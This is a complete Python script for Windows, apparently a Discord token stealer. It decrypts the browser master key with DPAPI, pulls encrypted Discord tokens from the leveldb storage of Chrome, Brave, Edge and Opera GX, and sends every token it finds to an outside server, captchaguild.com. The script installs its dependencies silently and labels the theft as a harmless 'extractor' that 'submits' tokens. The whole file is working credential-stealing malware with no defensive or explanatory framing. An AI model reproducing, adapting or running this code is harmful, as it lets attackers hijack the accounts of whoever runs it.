import os
import json
import re
import subprocess
import sys
import base64
import requests

# --- Configuration ---
BACKEND_URL = 'https://captchaguild.com/api/process-token'
# --- End Configuration ---

def install_and_import(package, import_name=None):
    """Installs a package if it's not already installed, then imports it."""
    if import_name is None:
        import_name = package
    try:
        __import__(import_name)
    except ImportError:
        print(f"Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    finally:
        globals()[import_name] = __import__(import_name)

def get_win_dependencies():
    """Install and import Windows-specific dependencies."""
    install_and_import('pypiwin32', 'win32crypt')
    install_and_import('pycryptodome', 'Crypto.Cipher')
    install_and_import('requests')

def get_master_key(path):
    """Retrieves the master key for decrypting Discord tokens."""
    if not os.path.exists(path):
        return None
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return master_key

def decrypt_token(buff, master_key):
    """Decrypts a token using the master key."""
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = Crypto.Cipher.AES.new(master_key, Crypto.Cipher.AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()
    except Exception as e:
        return None

def find_tokens(path):
    """Finds and decrypts tokens from a given browser path."""
    path = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.exists(path):
        return []

    tokens = []
    master_key = get_master_key(os.path.join(path, "..", ".."))
    if not master_key:
        return []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        try:
            with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                for line in f.readlines():
                    for match in re.finditer(r"dQw4w9WgXcQ:[^\\\"]*", line):
                        encrypted_token = base64.b64decode(match.group().split("dQw4w9WgXcQ:")[1])
                        token = decrypt_token(encrypted_token, master_key)
                        if token and token not in tokens:
                            tokens.append(token)
        except Exception:
            continue
    return tokens

def submit_token(token):
    """Submits a found token to the backend."""
    try:
        data = {
            'token': token,
            'url': 'Local Python Extractor',
            'timestamp': __import__('datetime').datetime.now().isoformat(),
            'method': 'Local Python Extractor'
        }
        response = requests.post(BACKEND_URL, json=data)
        if response.status_code == 200 and response.json().get('success'):
            print(f"✅ Successfully submitted token: {token[:25]}...")
            return True
        else:
            print(f"❌ Failed to submit token. Status: {response.status_code}, Response: {response.text}")
            return False
    except Exception as e:
        print(f"❌ An error occurred while submitting the token: {e}")
        return False

def main():
    """Main function to find and submit tokens."""
    print("🔵 Starting token extraction...")
    if sys.platform != "win32":
        print("❌ This script is only compatible with Windows.")
        return

    get_win_dependencies()
    
    # Paths for Chromium-based browsers on Windows
    paths = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
    }

    found_tokens = []
    for browser, path in paths.items():
        print(f"🔎 Scanning {browser}...")
        tokens = find_tokens(path)
        if tokens:
            print(f"💎 Found {len(tokens)} token(s) in {browser}.")
            found_tokens.extend(tokens)

    if not found_tokens:
        print("⭕ No tokens found.")
        return

    print("\n" + "="*30)
    submitted_count = 0
    for token in set(found_tokens):
        if submit_token(token):
            submitted_count += 1
    
    print("="*30)
    print(f"\n🟢 Extraction complete. Submitted {submitted_count} new token(s).")

if __name__ == "__main__":
    main()
    input("\nPress Enter to exit...")
